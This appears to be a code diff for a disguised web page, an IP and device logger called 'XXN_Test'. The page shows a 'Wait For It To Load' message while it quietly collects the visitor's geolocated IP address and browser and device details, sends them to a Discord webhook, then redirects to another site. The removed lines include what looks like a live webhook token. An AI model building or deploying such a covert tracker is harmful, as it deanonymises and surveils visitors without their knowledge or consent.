@@ -1,11 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta charset="UTF-8" /><title>XXN_Test</title></head>
+<head>
+<meta charset="UTF-8" />
+<title>XXN_Test</title>
+</head>
 <body>
 Wait For It To Load...
 <script>
   const ipinfo = {}, deviceinfo = {};
 
+  // Gather IP info
   function gatherIPInfo() {
     return fetch("https://ipapi.co/json/")
       .then(res => res.json())
@@ -23,54 +27,33 @@ Wait For It To Load...
           Timezone: data.timezone,
           Currency: `${data.currency} (${data.currency_name})`
         });
-      }).catch(() => Object.assign(ipinfo, { Error: "Failed to get IP info" }));
+      })
+      .catch(() => Object.assign(ipinfo, { Error: "Failed to get IP info" }));
   }
 
+  // Gather basic device info
   function gatherDeviceInfo() {
     const ua = navigator.userAgent;
     const platform = navigator.platform;
     const lang = navigator.language;
     const dnt = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
     const tzOffset = new Date().getTimezoneOffset();
-    const browserMatch = ua.match(/(Firefox|Chrome|Edg|Safari)\/[\d.]+/) || [];
-    const osMatch = ua.match(/\(([^)]+)\)/);
-    const now = new Date().toString();
 
     Object.assign(deviceinfo, {
-      Browser: browserMatch[0] || "Unknown",
-      OS: osMatch ? osMatch[1] : platform,
+      Browser: ua,
+      OS: platform,
       Platform: platform,
       Language: lang,
-      LocalTime: now,
       TimezoneOffset: tzOffset + " minutes",
-      Resolution: `${screen.width} × ${screen.height}`,
-      TouchSupport: ("ontouchstart" in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
       DoNotTrack: dnt,
-      Memory: (navigator.deviceMemory || "Unknown") + " GB",
-      CPUThreads: navigator.hardwareConcurrency || "Unknown",
-      Plugins: Array.from(navigator.plugins).map(p => p.name).join(", ") || "None"
+      Resolution: `${screen.width} × ${screen.height}`
     });
 
-    const batteryPromise = navigator.getBattery ? navigator.getBattery().then(battery => {
-      const status = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : "");
-      deviceinfo.Battery = status;
-    }).catch(() => {}) : Promise.resolve();
-
-    try {
-      const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-      const gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-      const gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      deviceinfo.GPU = `${gpuVendor} — ${gpuRenderer}`;
-    } catch {
-      deviceinfo.GPU = "Unavailable";
-    }
-
-    return batteryPromise;
+    return Promise.resolve();
   }
 
-  async function collectAndSend() {
+  // Collect info, send to Discord, then redirect
+  async function collectSendRedirect() {
     await gatherIPInfo();
     await gatherDeviceInfo();
 
@@ -83,14 +66,18 @@ Wait For It To Load...
 
     const payload = { content: lines.join("\n") };
 
-    fetch("https://discord.com/api/webhooks/1420561724410429472/qq07ULPd7_URtkJ8czru91tH2FRUgCgWbgkUODHXAf2XikB_qxrOhvTsLDKEUFwwvCUw", {
+    // Send to Discord webhook
+    fetch("https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     }).catch(() => {});
+
+    // Redirect in same tab
+    window.location.href = "https://vapor.my/"; // <-- replace with your target URL
   }
 
-  collectAndSend();
+  collectSendRedirect();
 </script>
 </body>
 </html>
